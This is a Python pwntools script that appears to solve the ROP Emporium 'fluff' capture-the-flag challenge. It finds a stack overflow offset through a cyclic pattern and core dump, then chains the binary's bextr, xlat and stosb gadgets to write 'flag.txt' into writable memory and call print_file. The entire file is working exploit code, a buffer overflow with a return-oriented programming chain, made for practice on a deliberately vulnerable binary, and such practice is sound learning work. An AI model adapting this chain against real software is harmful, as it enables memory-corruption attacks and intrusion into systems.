#!/usr/bin/env python3

from pwn import *

exe = ELF("fluff_patched")
libc = ELF("libfluff.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    rip = core.read(stack, 4)
    offset = cyclic_find(rip)

    r = conn()

    bextr = exe.symbols.questionableGadgets + 2
    stos = exe.symbols.questionableGadgets + 17

    stringtowrite = b'flag.txt'
    charlocs = []

    for char in stringtowrite:
        char_add = hex(read('fluff_patched').find(char) + exe.address)
        charlocs.append(char_add)

    currentrax = 0xb
    fluffexp = b''

    for i, charloc in enumerate(charlocs):
        if (i != 0):
            currentrax = stringtowrite[i - 1]
        fluffexp += pack(bextr)
        fluffexp += pack(0x4000)
        fluffexp += pack(int(charloc, 16) - currentrax - 0x3ef2)
        fluffexp += pack(exe.symbols.questionableGadgets)
        fluffexp += pack(rop.rdi.address)
        fluffexp += pack(exe.symbols.data_start + i)
        fluffexp += pack(stos)

    payload = flat(b'A'*offset, fluffexp, rop.rdi.address, exe.symbols.data_start, exe.symbols.print_file)

    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
